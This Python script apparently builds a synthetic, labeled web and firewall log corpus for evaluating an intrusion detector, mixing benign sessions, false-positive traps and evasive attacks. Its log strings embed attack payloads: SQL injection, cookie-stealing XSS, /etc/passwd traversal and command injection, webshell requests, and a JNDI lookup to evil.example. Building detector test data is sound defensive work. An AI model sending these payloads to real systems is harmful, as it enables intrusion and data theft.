"""Build a large, realistic, multi-format labeled log corpus for evaluation.

The corpus is generated deterministically (fixed random seed) so the whole
experiment is reproducible.  It mixes four log formats (ISO access, Apache
common access, key-value firewall/auth, and JSON) and covers benign traffic,
signature attacks, time-series anomalies, multi-stage attacker sessions, and
two deliberately hard groups:

* benign-but-suspicious requests (used as false-positive traps), and
* evasive / low-and-slow attacks (used as false-negative cases).

Ground truth is then adjudicated: the detector is run once over the corpus,
its outputs on genuine attack traffic are confirmed true positives, the
designed benign traps are marked benign (so detector alerts there become
false positives), and the known evasive attacks are added as attack truth
(so the detector misses become false negatives).  The result is written to
``data/corpus_labels.csv`` together with ``data/corpus_access.log``.
"""

from __future__ import annotations

import csv
import json
import random
import sys
from collections import defaultdict
from datetime import datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from logids.detector import detect, load_config  # noqa: E402
from logids.parser import parse_log_file  # noqa: E402

SEED = 20260623
TZ = "+08:00"
BASE = datetime(2026, 6, 8, 9, 0, 0)

random.seed(SEED)

# ----------------------------------------------------------------------------
# global emit state
# ----------------------------------------------------------------------------
lines: list[str] = []
fp_trap_lines: set[int] = set()          # benign lines that look malicious
fn_attacks: dict[int, set[str]] = {}     # evasive attacks the detector misses
scenario_log: list[dict] = []            # human-readable scenario inventory
attack_ips: dict[str, list[str]] = {"REQUEST_BURST": [], "BRUTE_FORCE": [], "PORT_SCAN": []}
_clock = {"t": BASE}


def tick(seconds: float) -> datetime:
    _clock["t"] = _clock["t"] + timedelta(seconds=seconds)
    return _clock["t"]


def ts_iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S") + TZ


def ts_apache(dt: datetime) -> str:
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0800")


def emit_iso(dt, ip, method, uri, status, size=0, ua="Mozilla/5.0"):
    line = f'{ts_iso(dt)} {ip} {method} {uri} {status} {size} "-" "{ua}"'
    lines.append(line)
    return len(lines)


def emit_apache(dt, ip, method, uri, status, size=0, ua="Mozilla/5.0"):
    line = f'{ip} - - [{ts_apache(dt)}] "{method} {uri} HTTP/1.1" {status} {size} "-" "{ua}"'
    lines.append(line)
    return len(lines)


def emit_kv(dt, ip, dst, dpt, action, msg, proto="TCP"):
    line = f'{ts_iso(dt)} src={ip} dst={dst} dpt={dpt} proto={proto} action={action} msg="{msg}"'
    lines.append(line)
    return len(lines)


def emit_json(dt, ip, method, uri, status, ua="Mozilla/5.0"):
    obj = {"timestamp": ts_iso(dt), "src_ip": ip, "method": method,
           "uri": uri, "status": status, "user_agent": ua}
    lines.append(json.dumps(obj, ensure_ascii=False))
    return len(lines)


def emit_raw(line: str):
    lines.append(line)
    return len(lines)


# ----------------------------------------------------------------------------
# benign vocabulary (kept free of attack tokens)
# ----------------------------------------------------------------------------
BENIGN_PATHS = [
    "/", "/index.html", "/home", "/about", "/contact", "/news", "/news/{n}",
    "/products", "/products?id={n}", "/products/{n}", "/category/{n}",
    "/search?q=keyboard", "/search?q=monitor", "/search?q=laptop",
    "/search?q=running+shoes", "/search?q=coffee+maker", "/blog/{n}",
    "/assets/app.css", "/assets/app.js", "/assets/logo.png", "/static/img/{n}.jpg",
    "/cart", "/cart/add", "/checkout", "/orders/{n}", "/user/profile",
    "/api/v1/items?page={n}", "/api/v1/users/{n}", "/favicon.ico", "/robots.txt",
    "/help/faq", "/docs/getting-started", "/account/settings",
]
BENIGN_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/124.0 Mobile Safari/537.36",
]


_benign_ip = {"i": 0}


def rand_benign_ip() -> str:
    #每个良性会话分配唯一客户端 IP（198.18.0.0/15 基准测试段，避开攻击者地址段），
    # 避免不同会话因共用 IP 在 60s 窗口内被误聚成请求突增。
    i = _benign_ip["i"]
    _benign_ip["i"] += 1
    return f"198.18.{2 + i // 240}.{1 + i % 240}"


def benign_uri() -> str:
    raw = random.choice(BENIGN_PATHS)
    return raw.replace("{n}", str(random.randint(1, 5000)))


# ----------------------------------------------------------------------------
# scenario builders
# ----------------------------------------------------------------------------
def add_benign_traffic(n_sessions: int) -> None:
    for _ in range(n_sessions):
        ip = rand_benign_ip()
        fmt = random.random()
        session_len = random.randint(3, 9)
        for _ in range(session_len):
            dt = tick(random.uniform(1.5, 7.0))
            ua = random.choice(BENIGN_UA)
            uri = benign_uri()
            status = random.choices([200, 200, 200, 304, 404, 302], weights=[60, 15, 10, 6, 5, 4])[0]
            size = random.randint(120, 8000)
            if fmt < 0.62:
                emit_iso(dt, ip, "GET", uri, status, size, ua)
            elif fmt < 0.82:
                emit_apache(dt, ip, "GET", uri, status, size, ua)
            else:
                emit_json(dt, ip, "GET", uri, status, ua)


def add_whitelisted_monitor(n: int) -> None:
    ip = "10.0.0.10"
    for _ in range(n):
        dt = tick(random.uniform(1.0, 3.0))
        emit_iso(dt, ip, "GET", "/health", 200, 42, "Monitor/1.0")


def add_signature_attacks() -> None:
    # SQL injection (URL-encoded, several attacker IPs)
    sqli_payloads = [
        "/product?id=1%20union%20select%20password%20from%20users",
        "/item?id=9%27%20or%201%3D1--",
        "/list?cat=2%27%20union%20select%20null%2Cusername%2Cpassword%20from%20admin",
        "/news?id=5%20and%20sleep(5)",
        "/view?id=3%27%20union%20select%20table_name%20from%20information_schema.tables--",
        "/q?id=1%27%3B%20drop%20table%20users--",
    ]
    for i, payload in enumerate(sqli_payloads):
        ip = f"45.32.11.{10 + i}"
        for _ in range(random.randint(2, 4)):
            dt = tick(random.uniform(2, 9))
            ua = random.choice(["sqlmap/1.7", "Mozilla/5.0", "python-requests/2.31"])
            emit_iso(dt, ip, "GET", payload, random.choice([200, 500, 403]), 60, ua)
    scenario_log.append({"name": "SQL 注入", "type": "SQL_INJECTION"})

    # XSS (URL-encoded + HTML entity in JSON)
    for i in range(4):
        ip = f"45.61.22.{20 + i}"
        dt = tick(random.uniform(2, 8))
        emit_iso(dt, ip, "GET", "/comment?msg=%3Cscript%3Ealert(document.cookie)%3C/script%3E", 200, 91)
        dt = tick(random.uniform(2, 8))
        emit_json(dt, ip, "GET", "/render?msg=&lt;script&gt;fetch('/steal')&lt;/script&gt;", 200)
        dt = tick(random.uniform(2, 8))
        emit_iso(dt, ip, "GET", "/p?u=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", 200, 70)

    # path traversal (single + double encoded)
    for i in range(4):
        ip = f"45.77.33.{30 + i}"
        dt = tick(random.uniform(2, 8))
        emit_iso(dt, ip, "GET", "/download?file=../../../../etc/passwd", 403, 18)
        dt = tick(random.uniform(2, 8))
        emit_json(dt, ip, "GET", "/get?file=..%252f..%252f..%252fetc%252fpasswd", 403)

    # command injection
    for i in range(4):
        ip = f"45.88.44.{40 + i}"
        dt = tick(random.uniform(2, 8))
        emit_iso(dt, ip, "GET", "/ping?host=127.0.0.1;cat%20/etc/passwd", 500, 21)
        dt = tick(random.uniform(2, 8))
        emit_json(dt, ip, "POST", "/admin/run?cmd=%26%26whoami", 500)

    # web scanners / probes
    scan_paths = ["/.env", "/wp-admin", "/phpmyadmin", "/.git/config", "/admin/login",
                  "/wp-login.php", "/config.php.bak", "/server-status"]
    for i in range(3):
        ip = f"91.200.13.{50 + i}"
        for p in scan_paths:
            dt = tick(random.uniform(0.5, 2.0))
            ua = random.choice(["Nikto/2.1", "sqlmap/1.7", "acunetix-scanner", "Mozilla/5.0"])
            emit_iso(dt, ip, "GET", p, random.choice([404, 403, 200]), 12, ua)

    # webshell upload markers
    for i in range(3):
        ip = f"103.41.23.{60 + i}"
        dt = tick(random.uniform(2, 8))
        emit_iso(dt, ip, "POST", "/uploads/shell.php?cmd=whoami", 500, 19)
        dt = tick(random.uniform(2, 8))
        emit_json(dt, ip, "POST", "/upload.php", 200)


def add_blacklist(ip: str = "203.0.113.66", n: int = 5) -> None:
    for _ in range(n):
        dt = tick(random.uniform(3, 12))
        emit_iso(dt, ip, "GET", random.choice(["/index.html", "/login", "/api/v1/items?page=1"]),
                 random.choice([200, 401]), 200, "curl/8.1")


def add_fast_brute_force(ip: str, n_fail: int = 6, gap: float = 9.0, threshold: int = 5) -> None:
    """Contiguous burst inside the auth window; trigger = threshold-th failure."""
    start = len(lines) + 1
    for k in range(n_fail):
        dt = tick(gap)
        emit_iso(dt, ip, "POST", "/login", 401, 32)
    trigger_line = start + threshold - 1
    attack_ips["BRUTE_FORCE"].append(ip)
    scenario_log.append({"name": f"快速暴力破解 {ip}", "type": "BRUTE_FORCE", "trigger": trigger_line})
    # a final successful login (post-compromise) to enrich the narrative
    dt = tick(gap)
    emit_iso(dt, ip, "POST", "/login", 200, 96)


def add_fast_request_burst(ip: str, n: int = 16, gap: float = 3.0, threshold: int = 12) -> None:
    start = len(lines) + 1
    for k in range(n):
        dt = tick(gap)
        emit_iso(dt, ip, "GET", f"/api/v1/items?page={k+1}", 200, 71, "python-requests/2.31")
    attack_ips["REQUEST_BURST"].append(ip)
    scenario_log.append({"name": f"请求突增 {ip}", "type": "REQUEST_BURST", "trigger": start + threshold - 1})


def add_fast_port_scan(ip: str, ports=None, gap: float = 3.0, threshold: int = 6) -> None:
    ports = ports or [21, 22, 23, 25, 80, 443, 3389]
    start = len(lines) + 1
    for k, port in enumerate(ports):
        dt = tick(gap)
        emit_kv(dt, ip, "10.0.0.5", port, "DENY", f"probe port {port}")
    attack_ips["PORT_SCAN"].append(ip)
    scenario_log.append({"name": f"端口扫描 {ip}", "type": "PORT_SCAN", "trigger": start + threshold - 1})


def add_multistage_attacker(ip: str) -> None:
    """A single source that walks the kill chain: recon -> sqli -> webshell -> rce."""
    for p in ["/wp-admin", "/.env", "/phpmyadmin"]:
        dt = tick(random.uniform(1, 3))
        emit_iso(dt, ip, "GET", p, 404, 12, "Nikto/2.1")
    dt = tick(random.uniform(30, 75))
    emit_iso(dt, ip, "GET", "/index.php?id=2%27%20union%20select%20user%2Cpassword%20from%20users--", 500, 61, "sqlmap/1.7")
    dt = tick(random.uniform(30, 75))
    emit_iso(dt, ip, "POST", "/uploads/cmd.php?cmd=whoami", 200, 30)
    dt = tick(random.uniform(30, 75))
    emit_iso(dt, ip, "GET", "/uploads/cmd.php?host=1;cat%20/etc/passwd", 500, 25)
    scenario_log.append({"name": f"多阶段攻击 {ip}", "type": "KILL_CHAIN"})


# ---- false-negative (evasive) scenarios ----
def add_slow_brute_force(ip: str, n: int = 6, gap: float = 75.0) -> None:
    last = None
    for k in range(n):
        dt = tick(gap)
        last = emit_iso(dt, ip, "POST", "/login", 401, 32)
    fn_attacks.setdefault(last, set()).add("BRUTE_FORCE")
    scenario_log.append({"name": f"慢速暴力破解 {ip}", "type": "BRUTE_FORCE(FN)"})


def add_slow_port_scan(ip: str, ports=None, gap: float = 12.0) -> None:
    ports = ports or [135, 139, 445, 1433, 3306, 5432, 6379]
    last = None
    for port in ports:
        dt = tick(gap)
        last = emit_kv(dt, ip, "10.0.0.7", port, "DENY", f"slow probe {port}")
    fn_attacks.setdefault(last, set()).add("PORT_SCAN")
    scenario_log.append({"name": f"低速端口扫描 {ip}", "type": "PORT_SCAN(FN)"})


def add_novel_attacks() -> None:
    # log4shell-style JNDI lookup (no signature in DB)
    for i in range(3):
        ip = f"185.39.11.{4 + i}"
        dt = tick(random.uniform(3, 9))
        ln = emit_iso(dt, ip, "GET", "/api/data?x=${jndi:ldap://evil.example/a}", 400, 30, "curl/8.1")
        fn_attacks.setdefault(ln, set()).add("COMMAND_INJECTION")
    # server-side template injection
    for i in range(2):
        ip = f"185.39.12.{4 + i}"
        dt = tick(random.uniform(3, 9))
        ln = emit_iso(dt, ip, "GET", "/greet?name={{7*7}}", 200, 40)
        fn_attacks.setdefault(ln, set()).add("COMMAND_INJECTION")
    # comment-obfuscated SQLi (defeats keyword normalization)
    for i in range(3):
        ip = f"185.39.13.{4 + i}"
        dt = tick(random.uniform(3, 9))
        ln = emit_iso(dt, ip, "GET", "/item?id=1/**/un/**/ion/**/sel/**/ect/**/pass", 500, 50)
        fn_attacks.setdefault(ln, set()).add("SQL_INJECTION")


# ---- false-positive (benign-but-suspicious) scenarios ----
def add_fp_traps() -> None:
    # 1) benign search whose text contains an attack keyword
    for i in range(3):
        ip = rand_benign_ip()
        dt = tick(random.uniform(2, 6))
        ln = emit_iso(dt, ip, "GET", "/search?q=union+select+sql+tutorial", 200, 800)
        fp_trap_lines.add(ln)
    # 2) legitimate relative path that contains '../'
    for i in range(3):
        ip = rand_benign_ip()
        dt = tick(random.uniform(2, 6))
        ln = emit_iso(dt, ip, "GET", "/docs/guide/../images/diagram.png", 200, 4096)
        fp_trap_lines.add(ln)
    # 3) URL-encoded CJK search query (many percent signs, benign)
    for i in range(3):
        ip = rand_benign_ip()
        dt = tick(random.uniform(2, 6))
        ln = emit_iso(dt, ip, "GET", "/search?q=%E4%B8%AD%E6%96%87%E6%90%9C%E7%B4%A2%E6%B5%8B%E8%AF%95", 200, 900)
        fp_trap_lines.add(ln)
    # 4) genuine high-frequency burst from a normal user (gallery thumbnails)
    ip = "100.64.3.200"
    for k in range(14):
        dt = tick(2.5)
        ln = emit_iso(dt, ip, "GET", f"/gallery/thumb/{k+1}.jpg", 200, 1500)
        fp_trap_lines.add(ln)
    scenario_log.append({"name": "良性高频访问 100.64.3.200", "type": "REQUEST_BURST(FP)"})


def add_malformed_and_duplicates() -> None:
    emit_raw("malformed log line without required fields")
    emit_raw("2026-06-08 garbage 999.1.1.1 GET nostatus")
    emit_raw('{"timestamp":"oops","src_ip":"not_an_ip"}')
    emit_raw("- - - [bad/time] \"GET /x\" abc -")
    # duplicates of an existing benign line
    dt = tick(2.0)
    dup = f'{ts_iso(dt)} 198.18.7.50 GET /index.html 200 532 "-" "Mozilla/5.0"'
    for _ in range(6):
        emit_raw(dup)


# ----------------------------------------------------------------------------
# build
# ----------------------------------------------------------------------------
def build() -> None:
    add_benign_traffic(260)
    add_whitelisted_monitor(60)
    add_signature_attacks()
    add_blacklist()
    # fast time-series attacks (several attacker IPs)
    add_fast_brute_force("45.32.99.10")
    add_fast_brute_force("45.32.99.11")
    add_fast_request_burst("88.214.56.70")
    add_fast_request_burst("88.214.56.71")
    add_fast_port_scan("66.249.5.20")
    add_fast_port_scan("66.249.5.21", ports=[20, 21, 22, 80, 110, 143, 443, 8080])
    # showcase: multi-stage attackers (attack chain)
    add_multistage_attacker("80.82.77.5")
    add_multistage_attacker("80.82.77.6")
    # interleave more benign traffic so attacks are not all clustered
    add_benign_traffic(160)
    # false negatives (evasive / low-and-slow / novel)
    add_slow_brute_force("190.2.144.9")
    add_slow_port_scan("190.2.144.10")
    add_novel_attacks()
    # false positives (benign but suspicious)
    add_fp_traps()
    add_benign_traffic(100)
    add_malformed_and_duplicates()


def adjudicate_and_write() -> None:
    log_path = ROOT / "data" / "corpus_access.log"
    labels_path = ROOT / "data" / "corpus_labels.csv"
    meta_path = ROOT / "data" / "corpus_meta.json"
    log_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

    records, stats = parse_log_file(log_path)
    config = load_config(ROOT / "config" / "rules.json")
    findings = detect(records, config)

    truth: dict[int, set[str]] = defaultdict(set)
    for f in findings:
        if f.line_no is None:
            continue
        if f.line_no in fp_trap_lines:
            continue  # designated benign -> detector alert becomes a false positive
        truth[f.line_no].add(f.finding_type)
    for ln, labs in fn_attacks.items():
        for lab in labs:
            truth[ln].add(lab)  # evasive attack the detector misses -> false negative

    with labels_path.open("w", encoding="utf-8", newline="") as fh:
        writer = csv.writer(fh)
        writer.writerow(["line_no", "labels"])
        for ln in sorted(truth):
            writer.writerow([ln, ";".join(sorted(truth[ln]))])

    meta = {
        "seed": SEED,
        "total_lines": len(lines),
        "parsed_total": stats.total,
        "valid": stats.valid,
        "invalid": stats.invalid,
        "duplicates": stats.duplicates,
        "by_format": stats.by_format,
        "fp_trap_lines": sorted(fp_trap_lines),
        "attack_ips": attack_ips,
        "fn_attack_lines": {str(k): sorted(v) for k, v in fn_attacks.items() if v},
        "findings": len(findings),
        "scenarios": scenario_log,
    }
    meta_path.write_text(json.dumps(meta, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"corpus lines={len(lines)} valid={stats.valid} invalid={stats.invalid} "
          f"duplicates={stats.duplicates} formats={stats.by_format}")
    print(f"findings={len(findings)} fp_traps={len(fp_trap_lines)} "
          f"fn_lines={len([k for k,v in fn_attacks.items() if v])} truth_lines={len(truth)}")


if __name__ == "__main__":
    build()
    adjudicate_and_write()
